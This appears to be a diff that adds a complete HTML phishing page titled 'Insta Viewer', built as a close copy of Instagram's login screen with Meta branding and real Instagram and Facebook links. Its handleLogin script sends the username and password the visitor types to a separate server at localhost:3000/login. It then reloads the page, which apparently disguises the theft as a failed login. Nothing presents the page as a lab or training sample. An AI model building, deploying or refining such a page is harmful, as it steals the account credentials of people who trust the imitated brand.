@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="bg">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://fontawesome.com/icons/meta?f=brands&s=solid">
+  <link rel="icon" type="image/x-icon" href="tab-image.webp">
+  <title>Insta Viewer</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      width: 100%;
+      height: 100%;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 1.6;
+      background: white;
+      color: #222;
+      width: 100%;
+      height: 100%;
+    }
+
+    .container {
+      width: 100%;
+      display: flex;
+      flex-direction: row;
+      background-color: white;
+      height: 92%;
+      border-bottom: 2px solid #DFE2E5;
+    }
+
+    .left {
+      width: 65%;
+      height: 100%;
+      background-color: white;
+      border-right: 2px solid #DFE2E5;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    .right {
+      width: 35%;
+      height: 100%;
+      background-color: white;
+      padding-top: 8.5%;
+      padding-bottom: 9%;
+      padding-left: 3%;
+      padding-right: 3%;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    .moto-container {
+      width: 100%;
+      height: 35%;
+    }
+
+    .text-1 {
+      text-align: center;
+      font-size: 2.65vw;
+      margin-top: 11%;
+      font-weight: 400;
+      font-family: sans-serif;
+      margin-left: 4%;
+    }
+
+    .text-2 {
+      text-align: center;
+      font-size: 2.65vw;
+      margin-top: -1.8%;
+      font-weight: 400;
+      font-family: sans-serif;
+      margin-left: 4%;
+    }
+
+    p > span {
+      background-image: linear-gradient(116deg, #ff5c00, #ff0069, #d300c5);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .moto-img {
+      width: 100%;
+      height: 65%;
+      object-fit: cover;
+    }
+
+    .logo {
+      width: 100px;
+      height: 100px;
+      position: absolute;
+      left: 3.7%;
+      top: 4.7%;
+    }
+
+    .mobile-logo, .mobile-lang {
+      display: none;
+    }
+
+    .log-into-text {
+      color: #111112;
+      font-weight: 600;
+      font-size: 1.0625rem;
+      line-height: calc(1.2941 * 1em);
+      margin-bottom: 4%;
+      font-family: Segoe UI, Helvetica, Arial, sans-serif;
+    }
+
+    .input-group {
+      position: relative;
+      width: 100%;
+    }
+
+    input {
+      border-radius: 16px;
+      padding-top: 26px;
+      padding-left: 15px;
+      padding-right: 15px;
+      padding-bottom: 15px;
+      color: #111112;
+      border: 1px solid #D0D3D6;
+      font-size: 1rem;
+      font-family: system-ui, sans-serif;
+      font-weight: 500;
+      line-height: 1.1667;
+      width: 100%;
+    }
+
+    input:hover {
+      border: 1px solid #666A72;
+    }
+
+    input:focus-visible {
+      outline: none;
+      border: 1px solid #666A72;
+    }
+
+    input:first-of-type {
+      margin-bottom: 10px;
+    }
+
+    .input-group label {
+      position: absolute;
+      left: 14px;
+      top: 45%;
+      transform: translateY(-60%);
+      font-size: 1rem;
+      color: #505050b9;
+      background: #fff;
+      padding: 0 4px;
+      pointer-events: none;
+      transition: all 0.2s ease;
+      font-weight: 500;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    }
+
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top: 0%;
+      transform: translateY(15%);
+      font-size: 0.85rem;
+    }
+
+    .password-group input {
+      padding-right: 48px;
+      margin-bottom: 20px;
+    }
+
+    .password-group label {
+      top: 38%;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 14px;
+      top: 38%;
+      transform: translateY(-50%);
+      border: none;
+      background: transparent;
+      padding: 0;
+      margin: 0;
+      cursor: pointer;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      color: #111112;
+    }
+
+    .toggle-password:focus {
+      outline: none;
+    }
+
+    .toggle-password .eye-closed {
+      display: none;
+    }
+
+    .toggle-password.showing .eye-open {
+      display: none;
+    }
+
+    .toggle-password.showing .eye-closed {
+      display: block;
+    }
+
+
+    #login-btn {
+      border-radius: 30px;
+      padding: 12px;
+      border: none;
+      color: #F2F4F6;
+      background-color: #0064E0;
+      font-size: 0.9375rem;
+      line-height: calc(1.2667 * 1em);
+      font-weight: 500;
+      opacity: 0.4;
+      font-family: Segoe UI, Helvetica, Arial, sans-serif;
+    }
+
+    .forgot-pass {
+      border-radius: 30px;
+      padding: 12px;
+      color: #111112;
+      font-size: 0.9375rem;
+      line-height: calc(1.2667 * 1em);
+      font-weight: 500;
+      margin-top: 2%;
+      border: none;
+      font-family: Segoe UI, Helvetica, Arial, sans-serif;
+      background-color: white;
+    }
+
+    .facebook-btn {
+      border-radius: 30px;
+      padding: 12px;
+      color: #111112;
+      font-size: 0.9375rem;
+      line-height: calc(1.2667 * 1em);
+      font-weight: 500;
+      margin-top: 10%;
+      border: 1px solid #D0D3D6;
+      font-family: Segoe UI, Helvetica, Arial, sans-serif;
+      background-color: white;
+      margin-bottom: 2%;
+    }
+
+    .facebook-btn:hover, .new-account-btn:hover, .forgot-pass:hover {
+      cursor: pointer;
+      background-color: rgba(0, 0, 0, 0.05);
+    }
+
+    .facebook-btn > svg {
+      position: relative;
+      top: 3px;
+      right: 5px;
+    }
+
+    .new-account-btn {
+      border-radius: 30px;
+      padding: 12px;
+      color: #0064E0;
+      border: 1px solid #0064E0;
+      font-size: 0.9375rem;
+      line-height: calc(1.2667 * 1em);
+      font-weight: 500;
+      font-family: Segoe UI, Helvetica, Arial, sans-serif;
+      background-color: white;
+    }
+
+    .meta-container {
+      text-align: center;
+      width: 100%;
+      color: #111112;
+      margin-top: 4%;
+      font-family: Segoe UI, Helvetica, Arial, sans-serif;
+      font-weight: 500;
+    }
+
+    .report {
+      width: 100%;
+      text-align: center;
+      font-weight: 400;
+      font-size: 0.8125rem;
+      color: #666A72;
+      font-family: Segoe UI, Helvetica, Arial, sans-serif;
+      margin-top: 2%;
+    }
+
+    a {
+      text-decoration: none;
+      font-weight: 700;
+      color: #0064E0;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+    
+    footer {
+      width: 100%;
+      height: 8%;
+      background-color: white;
+      text-align: center;
+      color: rgb(115, 115, 115);
+      margin-top: 1.1%;
+    }
+
+    .footer-tag {
+      padding: 5px;
+      font-family: BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
+      font-weight: 400;
+      font-size: 12px;
+    }
+
+    .select-tag {
+      border: none;
+      cursor: pointer;
+      color: rgb(115, 115, 115);
+      margin-right: 5px;
+    }
+
+    .select-tag:focus-visible{
+      border: none;
+      outline: none;
+    }
+
+    .last-tag {
+      margin-top: 0.2%;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        height: 100%;
+        border-bottom: none;
+        margin: auto;
+      }
+
+      .left {
+        display: none;
+      }
+
+      .right {
+        margin-top: 45%;
+        width: 100%;
+        height: 65%;
+        padding: 32px 20px 24px;
+        justify-content: flex-start;
+      }
+
+      .mobile-lang {
+        display: block;
+        position: relative;
+        bottom: 30%;
+        margin: 0 auto;
+        color: #676767;
+        font-family: Segoe UI, Helvetica, Arial, sans-serif;
+        font-size: 1.06em;
+      }
+
+      .mobile-logo {
+        display: block;
+        width: 100px;
+        height: 100px;
+        margin: 0 auto 24px auto;
+        position: relative;
+        bottom: 15%;
+      }
+
+      .new-account-btn {
+        margin-top: 15%;
+      }
+
+      .log-into-text, .facebook-btn, .report, footer {
+        display: none;
+      }
+
+      .meta-container {
+        margin-top: 20px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .right {
+        padding: 24px 16px 20px;
+      }
+
+      .mobile-logo {
+        width: 88px;
+        height: 88px;
+        margin-bottom: 20px;
+      }
+
+      input {
+        font-size: 0.95rem;
+      }
+
+      .input-group label {
+        left: 12px;
+      }
+
+      #login-btn,
+      .new-account-btn {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <div class="moto-container">
+        <img class="logo" src="logo.webp" alt="logo" />
+        <p class="text-1">See everyday moments from</p>
+        <p class="text-2">your <span>close friends</span>.</p>
+      </div>
+      <img class="moto-img" src="image.png" alt="image" />
+    </div>
+
+    <div class="right" id="right">
+      <span class="mobile-lang">English (US)</span>
+      <img class="mobile-logo" src="logo.webp" alt="logo" />
+
+      <span class="log-into-text">Log into Instagram</span>
+
+      <div class="input-group">
+        <input type="text" id="name" name="name" placeholder=" " />
+        <label for="name">Mobile number, username or email</label>
+      </div>
+
+      <div class="input-group password-group">
+        <input type="password" id="password" name="password" placeholder=" " />
+        <label for="password">Password</label>
+
+        <button type="button" class="toggle-password" aria-label="Show password">
+          <svg viewBox="0 0 24 24" fill="currentColor" width="1.8em" height="1.8em" aria-hidden="true" class="eye-open">
+            <path fill-rule="evenodd" clip-rule="evenodd" d="M20.293 2.293a1 1 0 1 1 1.414 1.414l-18 18a1 1 0 0 1-1.414-1.414l3.446-3.446c-.238-.188-.47-.387-.694-.6L1.31 12.722a.985.985 0 0 1 0-1.436l3.734-3.527c3.15-2.976 7.77-3.542 11.48-1.697l3.768-3.768zm-5.275 5.275c-2.852-1.138-6.23-.596-8.582 1.627l-2.974 2.808 2.974 2.809c.233.22.476.423.727.61l1.391-1.39a4 4 0 0 1 5.478-5.478l.986-.986zm-2.5 2.5a2.001 2.001 0 0 0-2.45 2.45l2.45-2.45z"></path>
+            <path d="M22.69 11.285 19.7 8.463l-1.414 1.414 2.251 2.126-2.973 2.809a8.099 8.099 0 0 1-6.377 2.164l-1.712 1.712c3.268.833 6.876.02 9.48-2.44l3.733-3.527a.985.985 0 0 0 0-1.436z"></path>
+            <path d="M15.997 12.167a4 4 0 0 1-3.83 3.83l3.83-3.83z"></path>
+          </svg>
+
+          <svg fill="currentColor" viewBox="0 0 24 24" width="1.8em" height="1.8em" aria-hidden="true" class="eye-closed">
+            <path fill-rule="evenodd" d="M12 8.5a3.5 3.5 0 1 1 0 7 3.5 3.5 0 0 1 0-7m0 2a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3" clip-rule="evenodd"></path>
+            <path fill-rule="evenodd" d="M5.677 7.756c3.537-3.675 9.11-3.675 12.646 0l3.395 3.526a1.054 1.054 0 0 1 0 1.436l-3.395 3.526c-3.426 3.56-8.764 3.671-12.31.334l-.336-.334-3.395-3.526a1.054 1.054 0 0 1 0-1.436zm11.206 1.386c-2.75-2.857-7.016-2.857-9.766 0L4.367 12l2.75 2.857c2.75 2.857 7.016 2.857 9.766 0L19.632 12z" clip-rule="evenodd"></path>
+          </svg>
+        </button>
+      </div>
+
+      <button id="login-btn" type="submit" onclick="handleLogin()">Log in</button>
+
+      <button class="forgot-pass" onclick="window.location.href='https://www.instagram.com/accounts/password/reset/?hl=en'">
+        Forgot password?
+      </button>
+
+      <button class="facebook-btn" onclick="window.location.href='https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATqC2LRy2t2FXKqTi4X3Vewstu6lKING-W5zCB-clquNE51mKlsJPgqc_sQy4ijLRF3T1kc7UE0wFVdFFKI35k_pRi2DDV5fW78iFePASobCmHgCGZMxeRSgx8yuYoSbmiwjyvTatamvblLPOkjIYU-4M_IMqGN6-Gb5DgB16IvuQtbSag2KQYSjJneiDAALE4u-y7x5LyrNFELSZqEswb0DK7iIOJ8Z-Y9gTOEjqdBFNW5geAcCJfVnGKvePnqg1NVDISYICTcM-SyYJX78SqW0Yg'">
+          <svg viewBox="0 0 24 24" fill="#0064E0" width="1.1em" height="1.1em">
+            <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"></path>
+          </svg>
+          Log in with Facebook
+      </button>
+
+      <button class="new-account-btn" onclick="window.location.href='https://www.instagram.com/accounts/emailsignup/?next=&hl=en'">
+        Create new account
+      </button>
+
+      <div class="meta-container">
+        <svg aria-label="Meta logo" role="img" viewBox="-240 0 1000 200" width="120">
+          <path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#1C2B33"></path>
+          <path class="xt3erj5" d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#0180FA"></path>
+          <path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#_R_1ad9lplkldcpbn6b5ipamH1_)"></path>
+          <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#_R_1ad9lplkldcpbn6b5ipamH2_)"></path>
+          <path d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z" fill="url(#_R_1ad9lplkldcpbn6b5ipamH3_)"></path>
+        </svg>
+      </div>
+      <div class="report">
+        You can also <a href="https://help.instagram.com/contact/406206379945942/?locale=en_US" target="_blank">report content you believe is unlawful</a> in your country without logging in.
+      </div>
+    </div>
+  </div>
+  <footer>
+    <div>
+        <span class="footer-tag">Meta</span>
+        <span class="footer-tag">About</span>
+        <span class="footer-tag">Blog</span>
+        <span class="footer-tag">Jobs</span>
+        <span class="footer-tag">Help</span>
+        <span class="footer-tag">API</span>
+        <span class="footer-tag">Privacy</span>
+        <span class="footer-tag">Cookie Settings</span>
+        <span class="footer-tag">Terms</span>
+        <span class="footer-tag">Locations</span>
+        <span class="footer-tag">Instagram Lite</span>
+        <span class="footer-tag">Meta AI</span>
+        <span class="footer-tag">Threads</span>
+        <span class="footer-tag">Contact Uploading & Non-Users</span>
+        <span class="footer-tag">Meta Verified</span>
+        <div class="footer-tag last-tag">
+          <select class="footer-tag select-tag" name="lang">
+            <option value="English">English</option>
+          </select>
+          <span class="footer-tag">&copy; 2026 Instagram from Meta</span>
+        </div>
+    </div>
+</footer>
+</body>
+</html>
+
+<script>
+  const passwordInput = document.getElementById('password');
+  const togglePasswordBtn = document.querySelector('.toggle-password');
+  const nameInput = document.getElementById('name');
+  const loginBtn = document.getElementById('login-btn');
+  loginBtn.disabled = true;
+
+  // show hide button
+  passwordInput.addEventListener('input', function (e) {
+    if (e.target.value !== '') {
+      togglePasswordBtn.style.display = 'flex';
+    }
+    else {
+      togglePasswordBtn.style.display = 'none';
+    }
+
+    const hasName = nameInput.value.trim().length >= 1;
+    const hasValidPassword = passwordInput.value.length >= 6;
+
+    if (hasName && hasValidPassword) {
+      loginBtn.disabled = false;
+      loginBtn.style.opacity = '1';
+      loginBtn.style.cursor = 'pointer';
+    } else {
+      loginBtn.disabled = true;
+      loginBtn.style.opacity = '0.4';
+      loginBtn.style.cursor = 'default';
+    }
+  });
+
+  // change button state
+  togglePasswordBtn.addEventListener('click', function () {
+    const isPasswordHidden = passwordInput.type === 'password';
+
+    passwordInput.type = isPasswordHidden ? 'text' : 'password';
+    this.classList.toggle('showing', isPasswordHidden);
+    this.setAttribute(
+      'aria-label',
+      isPasswordHidden ? 'Hide password' : 'Show password'
+    );
+  });
+
+
+    // disable/enable login button
+    function validateForm() {
+      const hasName = nameInput.value.trim().length >= 1;
+      const hasValidPassword = passwordInput.value.length >= 6;
+
+      if (hasName && hasValidPassword) {
+        loginBtn.disabled = false;
+        loginBtn.style.opacity = '1';
+        loginBtn.style.cursor = 'pointer';
+      } else {
+        loginBtn.disabled = true;
+        loginBtn.style.opacity = '0.4';
+        loginBtn.style.cursor = 'default';
+      }
+    }
+
+    nameInput.addEventListener('input', validateForm);  
+
+
+  function handleLogin() {
+      const name = nameInput.value;
+      const password = passwordInput.value;
+
+      const data = { name : name, password: password };
+
+      fetch('http://localhost:3000/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json; charset=UTF-8'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => {
+        if (!response.ok) {
+          return {};
+        }
+        return response.json();
+      })
+      .then(data => {
+        location.reload(true);
+
+        nameInput.value = '';
+        passwordInput.value = '';
+        togglePasswordBtn.style.display = 'none';
+
+        loginBtn.disabled = true;
+        loginBtn.style.opacity = '0.4';
+        loginBtn.style.cursor = 'default';        
+      })
+      .catch(error => console.error('Error:', error));
+  }
+</script>
